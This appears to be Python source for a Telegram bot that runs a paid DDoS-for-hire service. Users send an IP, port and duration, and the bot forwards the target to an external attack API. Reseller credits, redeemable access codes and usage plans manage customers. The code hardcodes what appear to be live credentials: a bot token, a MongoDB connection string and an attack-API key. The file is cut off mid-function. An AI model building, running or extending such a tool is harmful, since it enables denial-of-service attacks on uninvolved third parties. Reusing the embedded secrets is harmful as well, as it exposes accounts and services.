import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import util as telebot_util
import threading
import re
from datetime import datetime, timedelta
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import secrets
import string
import os
import psutil
import platform
import html
from pymongo import MongoClient

# ================= CONFIG =================
BOT_TOKEN = "6863454476:AAGCem6I_wDrteHsfAoFqhp9yA_C_sFoRss"
BOT_OWNER = 1069319252

MONGO_URI = "mongodb+srv://Villain:hube@cluster0.ghtvtiv.mongodb.net"
DB_NAME = "attack_bot"

DEFAULT_API_URL = "https://spectreapi.cyou/api/v1/attack"
DEFAULT_API_KEY = "sp_live_v2_hsbmecp2LI1LcVWCXAzt8p2qdBuLAjAl"

DEFAULT_MAX_ATTACK_TIME = 120
DEFAULT_COOLDOWN = 80
DEFAULT_MAX_CONCURRENT = 1
PORT_BLOCK_DURATION = 7200  # 2 hours
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

# MongoDB setup
client = MongoClient(MONGO_URI)
db = client[DB_NAME]

# Collections
groups_col = db["approved_groups"]
limits_col = db["group_limits"]
bans_col = db["banned_users"]
resellers_col = db["resellers"]
keys_col = db["keys"]
plans_col = db["user_plans"]
attack_logs_col = db["attack_logs"]
key_logs_col = db["key_logs"]
blocked_codes_col = db["blocked_codes"]
settings_col = db["settings"]
known_users_col = db["known_users"]
user_attack_history_col = db["user_attack_history"]
all_groups_col = db["all_groups"]
admins_col = db["admins"]
admin_logs_col = db["admin_logs"]
pending_feedback_col = db["pending_feedback"]

# Initialize settings
if settings_col.count_documents({}) == 0:
    settings_col.insert_one({
        "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
        "cooldown": DEFAULT_COOLDOWN,
        "max_concurrent_attacks": DEFAULT_MAX_CONCURRENT,
        "port_protection": False,
        "feedback_system": False,
        "maintenance_mode": False,
        "maintenance_start_time": None,
        "api_url": DEFAULT_API_URL,
        "api_key": DEFAULT_API_KEY
    })

def get_setting(key, default=None):
    doc = settings_col.find_one()
    return doc.get(key, default) if doc else default

def update_setting(key, value):
    settings_col.update_one({}, {"$set": {key: value}}, upsert=True)

# ------------------ Helper Functions ------------------
def is_owner(user_id):
    return user_id == BOT_OWNER

def is_admin(user_id):
    return admins_col.count_documents({"_id": str(user_id)}) > 0

def is_admin_or_owner(user_id):
    return is_owner(user_id) or is_admin(user_id)

def log_admin_action(admin_id, action, details=None):
    admin_logs_col.insert_one({
        "timestamp": datetime.now().isoformat(),
        "admin_id": admin_id,
        "action": action,
        "details": details or ""
    })

def is_reseller(user_id):
    return resellers_col.count_documents({"_id": str(user_id)}) > 0

def is_approved_group(chat_id):
    return groups_col.count_documents({"_id": str(chat_id)}) > 0

def get_group_limits(chat_id):
    doc = limits_col.find_one({"_id": str(chat_id)})
    if doc:
        return doc.get("max_concurrent", 1), doc.get("max_time", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), doc.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def is_banned(user_id):
    return bans_col.count_documents({"_id": str(user_id)}) > 0

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

def record_known_user(user_id):
    known_users_col.update_one({"_id": str(user_id)}, {"$set": {"_id": str(user_id)}}, upsert=True)

def record_all_group(chat_id, title=""):
    all_groups_col.update_one({"_id": str(chat_id)}, {"$set": {"title": title}}, upsert=True)

def has_valid_plan(user_id, send_expiry_msg=True):
    plan = plans_col.find_one({"_id": str(user_id)})
    if not plan:
        return False
    expires = plan.get("expires")
    if expires:
        expires_dt = datetime.fromisoformat(expires)
        if datetime.now() > expires_dt:
            code = plan.get("redeemed_code")
            reseller_info = ""
            if code:
                key = keys_col.find_one({"_id": code})
                if key:
                    created_by = key.get("created_by")
                    if created_by and is_reseller(created_by):
                        try:
                            reseller_chat = bot.get_chat(int(created_by))
                            if reseller_chat.username:
                                reseller_info = f" Contact @{reseller_chat.username} to renew."
                            else:
                                reseller_info = f" Contact reseller {created_by} to renew."
                        except:
                            reseller_info = f" Contact reseller {created_by} to renew."
            plans_col.delete_one({"_id": str(user_id)})
            if send_expiry_msg:
                try:
                    bot.send_message(user_id, f"â Your access has expired.{reseller_info}")
                except:
                    pass
            return False
    if plan.get("attacks_left", 0) == 0:
        return False
    return True

def is_authorized(user_id, chat_id=None):
    """Check if user is authorized to use the bot (owner, admin, reseller, valid plan, or in approved group)."""
    if is_owner(user_id) or is_admin(user_id) or is_reseller(user_id):
        return True
    if has_valid_plan(user_id, send_expiry_msg=False):
        return True
    if chat_id and is_approved_group(chat_id) and not is_banned(user_id):
        return True
    return False

def get_user_limits(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 999999, 999999, 0
    plan = plans_col.find_one({"_id": str(user_id)})
    if plan:
        return 1, plan.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), plan.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def check_access(message):
    """Original access check for commands that require authorization."""
    user_id = message.from_user.id
    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "ð ï¸ Bot is under maintenance. Please try again later.")
        return False
    if is_owner(user_id) or is_admin(user_id):
        return True
    if is_group(message):
        record_all_group(message.chat.id, message.chat.title or "")
        if not is_approved_group(message.chat.id):
            bot.reply_to(message, "ð« This group is not approved!\nContact owner for approval.")
            return False
        if is_banned(user_id):
            bot.reply_to(message, "ð« You are banned! Contact owner.")
            return False
        return True
    if not is_group(message):
        record_known_user(user_id)
        if has_valid_plan(user_id):
            if is_banned(user_id):
                bot.reply_to(message, "ð« You are banned! Contact owner.")
                return False
            return True
        else:
            # Unauthorized private chat
            bot.reply_to(message, "ð Hello! This bot requires authorization in private chat.\n\nUse /redeem if you have a code, or join an authorized group.")
            return False
    return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

# ------------------ Attack Concurrency ------------------
active_attacks = {}
user_cooldowns = {}
_attack_lock = threading.Lock()
live_status_trackers = {}

def get_user_cooldown(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 0
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            del active_attacks[k]
        return len(active_attacks)

def get_group_active_attacks_count(chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('chat_id') == chat_id and attack.get('chat_type') in ['group', 'supergroup']:
                count += 1
        return count

def get_user_active_attacks_in_group(user_id, chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id and attack.get('chat_id') == chat_id:
                count += 1
        return count

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
    if key in blocked:
        block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
        if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
            return True, int(remaining)
        else:
            del blocked[key]
            settings_col.update_one({"_id": "blocked_ports"}, {"$set": blocked}, upsert=True)
    return False, 0

def check_port_protection(user_id, target, port):
    if not get_setting("port_protection", False) or is_owner(user_id) or is_admin(user_id):
        return False, 0
    key = f"{target}:{port}"
    history = user_attack_history_col.find_one({"_id": str(user_id)})
    if history and key in history.get("targets", {}):
        last_attack = datetime.fromisoformat(history["targets"][key])
        elapsed = (datetime.now() - last_attack).total_seconds()
        if elapsed < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - elapsed
            return True, int(remaining)
    return False

def execute_attack(target, port, duration):
    url = get_setting("api_url", DEFAULT_API_URL)
    api_key = get_setting("api_key", DEFAULT_API_KEY)
    headers = {"X-API-Key": api_key, "Content-Type": "application/json"}
    timeout = 15
    
    # Aapke naye API ke hisaab se format
    payload = {"target": target, "port": port, "duration": duration}
    
    session = requests.Session()
    retries = Retry(total=1, backoff_factor=0.5, status_forcelist=[500,502,503,504], raise_on_status=False)
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    try:
        resp = session.post(url, json=payload, headers=headers, timeout=timeout)
        if resp.status_code == 200 and "success" in resp.text:
            return resp
    except Exception as e:
        print(f"API Request Error: {e}")
        
    class DummyResponse:
        def __init__(self):
            self.status_code = 500
            self.text = '{"message": "API server rejected all attempts", "success": false}'
    return DummyResponse()

def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
    try:
        user_id = message.from_user.id
        bot.reply_to(message, f"ð Attack Started!\nð¯ Target: {target}\nð Port: {port}\nâ± Time: {duration}s\nð¡ Executions: 1\nð  Method: game\nð Location: Private\nâ³ Cooldown: {cooldown_seconds}s after attack")
        attack_logs_col.insert_one({"timestamp": datetime.now().isoformat(), "user_id": user_id, "target": target, "port": port, "duration": duration, "status": "started", "chat_type": message.chat.type})
        response = execute_attack(target, port, duration)
        api_success = response.status_code == 200
        if api_success:
            with _attack_lock:
                if not is_owner(user_id) and not is_admin(user_id):
                    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + cooldown_seconds)
            time.sleep(duration)
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            bot.reply_to(message, f"â Attack Complete!\nð¯ Target: {target}:{port}\nâ±ï¸ Duration: {duration}s\nâ³ Cooldown: {cooldown_seconds}s")
            attack_logs_col.insert_one({"timestamp": datetime.now().isoformat(), "user_id": user_id, "target": target, "port": port, "duration": duration, "status": "completed", "chat_type": message.chat.type})
        else:
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            attack_logs_col.insert_one({"timestamp": datetime.now().isoformat(), "user_id": user_id, "target": target, "port": port, "duration": duration, "status": "failed", "chat_type": message.chat.type})
            bot.reply_to(message, "â Attack failed due to API error.")
        # Set pending feedback flag if feedback system is ON
        if get_setting("feedback_system", False) and not is_owner(user_id) and not is_admin(user_id):
            pending_feedback_col.update_one({"_id": str(user_id)}, {"$set": {"_id": str(user_id)}}, upsert=True)
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        if get_setting("feedback_system", False) and not is_owner(message.from_user.id) and not is_admin(message.from_user.id):
            pending_feedback_col.update_one({"_id": str(message.from_user.id)}, {"$set": {"_id": str(message.from_user.id)}}, upsert=True)
        print(f"Attack error: {e}")

def log_key_event(event_type, code, created_by=None, redeemed_by=None, extra=""):
    key_logs_col.insert_one({"timestamp": datetime.now().isoformat(), "event": event_type, "code": code, "created_by": created_by, "redeemed_by": redeemed_by, "extra": extra})

def generate_code(prefix="", length=8):
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(secrets.choice(chars) for _ in range(length))
    if prefix:
        return f"{prefix.upper()}-{random_part}"
    return random_part

def format_expiry(expiry_dt):
    """Return a friendly expiry string like 'Wed Dec 31 12:09:44 2025'."""
    return expiry_dt.strftime("%a %b %d %H:%M:%S %Y")

# ------------------ Bot Commands ------------------
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "ð ï¸ Bot is under maintenance. Please try again later.")
        return
    if not is_group(message):
        record_known_user(user_id)
    if is_group(message):
        record_all_group(chat_id, message.chat.title or "")
    if is_authorized(user_id, chat_id):
        bot.reply_to(message, "ð Hello! I'm your attack manager bot. Use /help to see commands.")
    else:
        bot.reply_to(message, "ð Hello! This bot requires authorization in private chat.\n\nUse /redeem if you have a code, or join an authorized group.")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_group(message) and is_reseller(user_id):
        text = f"""ð¡ RESELLER HELP MENU ð¡

ââââââââââââââââââââââââââ
â   ð° RESELLER ONLY    â
ââââââââââââââââââââââââââ

ã CODE GENERATION ã
â¢ /gen <prefix> <days> <count> â Generate codes (1-7 days only)
  Cost: days Ã count Ã 100 credits
â¢ /mycredits â Check your credits
â¢ /redeem <code> â Redeem for yourself

ã ATTACK COMMANDS ã
â¢ /attack <ip> <port> <time> â Start attack
â¢ /status â Show active attacks
â¢ /ping â Check bot

ã GENERAL ã
â¢ /start â Start bot
â¢ /help â This menu
â¢ /getid â Get IDs

âââââââââââââââââââââââââ
ð° Credits: /mycredits
âï¸ Attack anywhere authorized"""
        bot.reply_to(message, text)
        return
    if is_authorized(user_id, chat_id):
        text = """ð¡ User Help Menu ð¡

General Commands:
ð¹ /start - Start interacting with the bot.
ð¹ /help - Display this help menu.
ð¹ /getid - Get the current chat ID.
ð¹ /ping - Check bot responsiveness.

Attack Commands:
ð¹ /attack - Start the attack.
ð¹ /status - Bot status with animation."""
        bot.reply_to(message, text)
    else:
        text = """ð¡ PUBLIC ACCESS ð¡

â You're not authorized in DMs

ã GET ACCESS ã
1ï¸â£ Buy code from reseller
2ï¸â£ /redeem YOUR-CODE
3ï¸â£ Or join authorized group

ã COMMANDS ã
â¢ /start - Start bot
â¢ /help - This menu
â¢ /redeem <code> - Redeem code
â¢ /getid - Your ID

ã GROUP ACCESS ã
Use bot in authorized groups!"""
        bot.reply_to(message, text)

@bot.message_handler(commands=['getid', 'id'])
def id_command(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_group(message):
        bot.reply_to(message, f"ð¤ Your User ID: {user_id}\nð¬ Chat ID: {chat_id}\nð± Chat Type: {message.chat.type}")
    else:
        bot.reply_to(message, f"ð¤ Your User ID: {user_id}\nð¬ Chat ID: {chat_id}\nð± Chat Type: private")

@bot.message_handler(commands=['ping'])
def ping_command(message):
    if not check_access(message):
        return
    start_time = time.time()
    sent = bot.reply_to(message, "ð Pong!")
    latency = int((time.time() - start_time) * 1000)
    active = get_active_attack_count()
    max_conc = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    groups_approved = groups_col.count_documents({})
    private_users = plans_col.count_documents({"expires": {"$gt": datetime.now().isoformat()}})
    maint = get_setting("maintenance_mode", False)
    maint_status = "â Disabled" if not maint else "ð¡ Enabled"
    bot.edit_message_text(f"ð Pong!\n\nâ¢ Response Time: {latency}ms\nâ¢ Active Attacks: {active}/{max_conc}\nâ¢ Active Groups: {groups_approved}\nâ¢ Private Users: {private_users}\nâ¢ Maintenance Mode: {maint_status}", chat_id=message.chat.id, message_id=sent.message_id)

@bot.message_handler(commands=['group_info'])
def group_info_command(message):
    if not is_group(message):
        bot.reply_to(message, "â This command can only be used in groups.")
        return
    if not check_access(message):
        return
    chat = message.chat
    title = html.escape(chat.title) if chat.title else str(chat.id)
    info = f"ð <b>Group Info:</b>\n\nð Name: {title}\nð ID: {chat.id}\nð¥ Type: {chat.type}"
    if chat.username:
        info += f"\nð Username: @{html.escape(chat.username)}"
    bot.reply_to(message, info, parse_mode="HTML")

@bot.message_handler(commands=['check_my_access'])
def check_my_access(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if is_group(message):
        if is_approved_group(message.chat.id):
            limits = get_group_limits(message.chat.id)
            bot.reply_to(message, f"â You are in an approved group.\n\nGroup limits: Max concurrent: {limits[0]}, Max time: {limits[1]}s, Cooldown: {limits[2]}s")
        else:
            bot.reply_to(message, "â This group is not approved.")
        return
    if is_owner(user_id) or is_admin(user_id):
        bot.reply_to(message, "ð You have unlimited access (Owner/Admin).")
        return
    plan = plans_col.find_one({"_id": str(user_id)})
    if not plan:
        bot.reply_to(message, "â You don't have an active plan. Redeem a key with /redeem <code>.")
        return
    expires = datetime.fromisoformat(plan["expires"])
    now = datetime.now()
    if now > expires:
        bot.reply_to(message, "â Your plan has expired. Please redeem a new key.")
        return
    remaining_time = expires - now
    days = remaining_time.days
    hours = remaining_time.seconds // 3600
    minutes = (remaining_time.seconds % 3600) // 60
    text = f"ð <b>Your Plan Details:</b>\n\nð¯ Attacks: {'Unlimited' if plan['attacks_left'] == -1 else plan['attacks_left']}\nâ±ï¸ Max duration: {plan['max_duration']}s\nâ³ Cooldown: {plan['cooldown']}s\nð Expires in: {days}d {hours}h {minutes}m\nð Expiry date: {expires.strftime('%Y-%m-%d %H:%M:%S')}"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['report'])
def report_command(message):
    if not check_access(message):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "â ï¸ Usage: /report <your message>\nExample: /report Bot is slow")
        return
    report_text = html.escape(parts[1])
    user = message.from_user
    user_info = f"User: {user.id}"
    if user.username:
        user_info += f" (@{html.escape(user.username)})"
    elif user.first_name:
        user_info += f" ({html.escape(user.first_name)})"
    forward_msg = f"ð¢ <b>New Report</b>\n\n{user_info}\n\nð Message:\n{report_text}"
    try:
        bot.send_message(BOT_OWNER, forward_msg, parse_mode="HTML")
        bot.reply_to(message, "â Your report has been sent to the owner. Thank you!")
        if get_setting("feedback_system", False):
            pending_feedback_col.delete_one({"_id": str(user.id)})
    except Exception as e:
        bot.reply_to(message, "â Failed to send report. Please try again later.")

# ------------------ Reseller Panel ------------------
@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "â Only resellers can access this panel.")
        return
    reseller = resellers_col.find_one({"_id": str(user_id)})
    credits = reseller.get("credits", 0) if reseller else 0
    if is_owner(user_id):
        credits = "Unlimited"
    text = f"""ð¡ <b>RESELLER HELP MENU</b> ð¡

ââââââââââââââââââââââââââ
â   ð° RESELLER ONLY    â
ââââââââââââââââââââââââââ

ã CODE GENERATION ã
â¢ /gen <prefix> <days> <count> â Generate codes (1-7 days only)
  Cost: days Ã count Ã 100 credits
â¢ /mycredits â Check your credits
â¢ /redeem <code> â Redeem for yourself

ã ATTACK COMMANDS ã
â¢ /attack <ip> <port> <time> â Start attack
â¢ /status â Show active attacks
â¢ /ping â Check bot

ã GENERAL ã
â¢ /start â Start bot
â¢ /help â This menu
â¢ /getid â Get IDs

âââââââââââââââââââââââââ
ð° Credits: /mycredits
âï¸ Attack anywhere authorized"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['mycredits', 'mycredit'])
def mycredit_cmd(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "â You are not a reseller.")
        return
    if is_owner(user_id):
        bot.reply_to(message, "ð Owner has unlimited credits.")
        return
    reseller = resellers_col.find_one({"_id": str(user_id)})
    credits = reseller.get("credits", 0) if reseller else 0
    bot.reply_to(message, f"ð³ Your credits: {credits}", parse_mode="HTML")

# ------------------ Key Generation (Reseller) â 1-7 days, unlimited attacks ------------------
@bot.message_handler(commands=['gen'])
def gen_reseller(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_admin_or_owner(user_id):
        bot.reply_to(message, "â Only resellers or admins can use this command.")
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "â ï¸ Usage: /gen <prefix> <days> <count>\nExample: /gen soveken 1 5")
        return
    prefix = parts[1]
    try:
        days = int(parts[2])
        count = int(parts[3])
    except:
        bot.reply_to(message, "â Days and count must be numbers.")
        return
    if days < 1 or days > 7:
        bot.reply_to(message, "â Resellers can only generate keys for 1 to 7 days.")
        return
    if count < 1 or count > 100:
        bot.reply_to(message, "â Count must be between 1 and 100.")
        return
    total_cost = days * count * 100
    if not is_admin_or_owner(user_id):
        reseller = resellers_col.find_one({"_id": str(user_id)})
        credits = reseller.get("credits", 0) if reseller else 0
        if credits < total_cost:
            bot.reply_to(message, f"â Insufficient credits! You have {credits} credits but need {total_cost}.\nCost: {days} days Ã {count} codes Ã 100 = {total_cost} credits")
            return
        resellers_col.update_one({"_id": str(user_id)}, {"$inc": {"credits": -total_cost}})
    codes = []
    expires = datetime.now() + timedelta(days=days)
    for _ in range(count):
        code = generate_code(prefix, 8)
        keys_col.insert_one({
            "_id": code,
            "type": "reseller_unlimited",
            "attacks_left": -1,   # UNLIMITED ATTACKS
            "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
            "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
            "expires": expires.isoformat(),
            "created_by": user_id,
            "redeemed_by": None,
            "redeemed_at": None,
            "trial": False,
            "created_at": datetime.now().isoformat(),
            "duration_days": days
        })
        codes.append(code)
        log_key_event("generated (reseller unlimited)", code, created_by=user_id, extra=f"prefix={prefix}, days={days}")
    code_list = "\n".join(codes)
    code_length = len(codes[0]) if codes else 0
    remaining = ""
    if not is_admin_or_owner(user_id):
        new_credits = resellers_col.find_one({"_id": str(user_id)})["credits"]
        remaining = f"\nð³ Credits remaining: {new_credits}"
    text = f"â Generated {count} private access codes:\n{code_list}\nð Code length: {code_length} characters\nâ³ Duration: {days} days\nð¯ Attacks: Unlimited{remaining}"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Redeem with fancy date formatting ------------------
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = message.from_user.id
    if is_group(message):
        bot.reply_to(message, "â ï¸ Please redeem in private chat.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /redeem <code>")
        return
    code = parts[1].upper()
    if blocked_codes_col.count_documents({"_id": code}) > 0:
        bot.reply_to(message, "â This code has been blocked by the owner.")
        return
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "â Invalid or expired code.")
        return
    if key.get("redeemed_by"):
        bot.reply_to(message, "â This code has already been redeemed.")
        return
    expires = datetime.fromisoformat(key["expires"])
    if datetime.now() > expires:
        keys_col.delete_one({"_id": code})
        bot.reply_to(message, "â This code has expired.")
        return
    plans_col.update_one({"_id": str(user_id)}, {"$set": {
        "attacks_left": key["attacks_left"],
        "max_duration": key["max_duration"],
        "cooldown": key["cooldown"],
        "expires": key["expires"],
        "redeemed_code": code
    }}, upsert=True)
    keys_col.update_one({"_id": code}, {"$set": {"redeemed_by": user_id, "redeemed_at": datetime.now().isoformat()}})
    log_key_event("redeemed", code, redeemed_by=user_id)
    attacks_text = "Unlimited" if key["attacks_left"] == -1 else key["attacks_left"]
    friendly_expiry = format_expiry(expires)
    bot.reply_to(message, f"â Code redeemed! Access granted until {friendly_expiry}", parse_mode="HTML")

# ------------------ Attack Command ------------------
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if get_setting("feedback_system", False) and not is_admin_or_owner(user_id):
        if pending_feedback_col.count_documents({"_id": str(user_id)}) > 0:
            bot.reply_to(message, "â ï¸ You need to submit feedback after your last attack.\n\nUse /report <message> to send feedback to the owner.")
            return
    max_concurrent_user, max_duration, cooldown_seconds = get_user_limits(user_id)
    if is_group(message):
        group_max_concurrent, group_max_time, group_cooldown = get_group_limits(message.chat.id)
        if not is_owner(user_id) and not is_admin(user_id):
            max_concurrent_user = min(max_concurrent_user, group_max_concurrent)
            max_duration = min(max_duration, group_max_time)
            cooldown_seconds = max(cooldown_seconds, group_cooldown)
            total_active_in_group = get_group_active_attacks_count(message.chat.id)
            if total_active_in_group >= group_max_concurrent:
                bot.reply_to(message, f"â Group attack limit reached! Only {group_max_concurrent} attack can run simultaneously in this group. Wait for it to finish.")
                return
            active_in_group = get_user_active_attacks_in_group(user_id, message.chat.id)
            if active_in_group >= max_concurrent_user:
                bot.reply_to(message, f"â You already have {active_in_group} active attack(s) in this group. Max concurrent: {max_concurrent_user}")
                return
    if not is_owner(user_id) and not is_admin(user_id):
        remaining_cd = get_user_cooldown(user_id)
        if remaining_cd > 0:
            bot.reply_to(message, f"â³ Cooldown active! Please wait {remaining_cd}s")
            return
        if user_has_active_attack(user_id):
            bot.reply_to(message, "â You already have an active attack! Wait for it to finish.")
            return
    active_count = get_active_attack_count()
    max_concurrent_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    if active_count >= max_concurrent_global and not is_admin(user_id) and not is_owner(user_id):
        bot.reply_to(message, f"â All attack slots busy! ({active_count}/{max_concurrent_global})\n\nCheck /status.")
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "â ï¸ Usage: /attack <ip> <port> <time>")
        return
    target, port, duration = parts[1], parts[2], parts[3]
    if not validate_target(target):
        bot.reply_to(message, "â Invalid IP!")
        return
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "â Invalid port! (1-65535)")
            return
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "â Port and time must be numbers!")
        return
    blocked, remaining = is_port_blocked(target, port)
    if blocked:
        mins = remaining // 60
        bot.reply_to(message, f"ð« This IP:Port is blocked!\n\nð¯ {target}:{port}\nâ³ {mins} min remaining")
        return
    if get_setting("port_protection", False) and not is_owner(user_id) and not is_admin(user_id):
        protected, p_remaining = check_port_protection(user_id, target, port)
        if protected:
            mins = p_remaining // 60
            bot.reply_to(message, f"ð¡ï¸ Port Protection Active!\n\nð¯ {target}:{port}\nâ³ You can attack same IP:Port after 2 hours\nâ³ {mins} min remaining")
            return
    if not is_owner(user_id) and not is_admin(user_id) and duration > max_duration:
        bot.reply_to(message, f"â Max attack time for you: {max_duration}s")
        return
    if not is_owner(user_id) and not is_admin(user_id) and not is_group(message):
        plan = plans_col.find_one({"_id": str(user_id)})
        if plan and plan["attacks_left"] != -1:
            if plan["attacks_left"] <= 0:
                bot.reply_to(message, "â You have no attacks left in your plan.")
                return
            plans_col.update_one({"_id": str(user_id)}, {"$inc": {"attacks_left": -1}})
            if plan["attacks_left"] == 1:
                bot.reply_to(message, "â ï¸ This was your last attack. Your plan is now exhausted.")
    attack_id = f"{user_id}_{datetime.now().timestamp()}"
    with _attack_lock:
        active_attacks[attack_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'user_id': user_id,
            'start_time': datetime.now(),
            'end_time': datetime.now() + timedelta(seconds=duration),
            'chat_type': message.chat.type,
            'chat_id': message.chat.id if is_group(message) else None
        }
    thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, cooldown_seconds))
    thread.start()

# ------------------ Status ------------------
def generate_status_text(user_id=None):
    active_count = get_active_attack_count()
    max_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    max_time_setting = get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

    text = f"â¡ Active Attacks: {active_count}/{max_global}\n"
    if active_count == 0:
        text += "\nNo active attacks."
    else:
        with _attack_lock:
            now = datetime.now()
            for atk in active_attacks.values():
                if atk['end_time'] > now:
                    remaining = int((atk['end_time'] - now).total_seconds())
                    total_duration = atk['duration']
                    elapsed = total_duration - remaining
                    progress = int((elapsed / total_duration) * 20) if total_duration > 0 else 20
                    bar = "â" * progress + "â" * (20 - progress)
                    percent = int((elapsed / total_duration) * 100) if total_duration > 0 else 100
                    chat_type_display = "Private" if atk.get('chat_type') == 'private' else "Group"
                    text += f"- {atk['target']}:{atk['port']} ({remaining}s) by {atk['user_id']} {chat_type_display}\n  {bar} {percent}%\n"
    text += f"\nâï¸ Settings:\nConcurrent = {max_global}\nMax Time = {max_time_setting}s"

    if user_id and not is_owner(user_id) and not is_admin(user_id):
        cd = get_user_cooldown(user_id)
        if cd > 0:
            text += f"\nâ³ Cooldown: {cd}s"
    return text

def live_status_updater(chat_id, message_id, stop_event, user_id):
    last_text = ""
    start_time = datetime.now()
    while not stop_event.is_set():
        if (datetime.now() - start_time).total_seconds() > 120:
            break
        current_text = generate_status_text(user_id)
        if current_text != last_text:
            try:
                bot.edit_message_text(current_text, chat_id=chat_id, message_id=message_id)
                last_text = current_text
            except:
                pass
        time.sleep(5)
    try:
        final_text = generate_status_text(user_id)
        bot.edit_message_text(final_text, chat_id=chat_id, message_id=message_id)
    except:
        pass

@bot.message_handler(commands=['status'])
def status_command(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    chat_id = message.chat.id
    if chat_id in live_status_trackers:
        live_status_trackers[chat_id].set()
    initial_text = generate_status_text(user_id)
    sent = bot.reply_to(message, initial_text)
    stop_event = threading.Event()
    live_status_trackers[chat_id] = stop_event
    thread = threading.Thread(target=live_status_updater, args=(chat_id, sent.message_id, stop_event, user_id))
    thread.daemon = True
    thread.start()

# ------------------ Advanced Owner Commands ------------------
@bot.message_handler(commands=['reset_user'])
def reset_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /reset_user <user_id>")
        return
    try:
        uid = int(parts[1])
        result = plans_col.delete_one({"_id": str(uid)})
        if result.deleted_count:
            log_admin_action(message.from_user.id, "reset_user", f"Reset plan for {uid}")
